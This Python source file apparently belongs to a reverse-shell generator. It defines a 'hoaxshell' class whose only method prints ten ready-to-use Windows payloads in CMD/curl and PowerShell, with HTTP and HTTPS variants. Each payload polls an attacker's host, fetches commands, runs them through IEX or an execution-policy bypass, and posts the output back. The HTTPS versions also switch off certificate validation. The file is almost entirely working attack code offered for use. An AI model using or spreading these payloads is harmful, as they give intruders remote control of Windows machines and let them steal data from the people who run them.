from core.core import *

class hoaxshell:

	def __init__(self,lport='9001',lhost=''):
		self.lhost=lhost
		self.lport=lport

	def get(self):
		return f'''
{TerminalColor.Orange}#WINDOWS CMD cURL
{TerminalColor.Cyan}@echo off&cmd /V:ON /C "SET ip={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL

{TerminalColor.Orange}#POWERSHELL IEX
{TerminalColor.Cyan}$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'''+f'''

{TerminalColor.Orange}#POWERSHELL IEX CONSTR LANG MODE
{TerminalColor.Cyan}$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}'''+f'''

{TerminalColor.Orange}#POWERSHELL OUTFILE
{TerminalColor.Cyan}$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'''+f'''

{TerminalColor.Orange}#POWERSHELL OUTFILE CONSTR LANG MODE
{TerminalColor.Cyan}$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}'''+f'''

{TerminalColor.Orange}#WINDOWS CMD cURL HTTPS{TerminalColor.Reset}
{TerminalColor.Cyan}@echo off&cmd /V:ON /C "SET ip={TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL

{TerminalColor.Orange}#POWERSHELL IEX HTTPS
{TerminalColor.Cyan}add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy '''+'''{public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy'''+f'''
$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}'';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'''+f'''
		
{TerminalColor.Orange}#POWERSHELL CONSTR LANG MODE IEX HTTPS
{TerminalColor.Cyan}add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy '''+'''{public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy'''+f'''
$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}'''+f'''

{TerminalColor.Orange}#POWERSHELL OUTFILE HTTPS
{TerminalColor.Cyan}add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy '''+'''{public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy'''+f'''
$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'''+f'''

{TerminalColor.Orange}#POWERSHELL OUTFILE CONSTR LANG MODE HTTPS
{TerminalColor.Cyan}add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy '''+'''{public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy'''+f'''
$s='{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @'''+'''{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}

		'''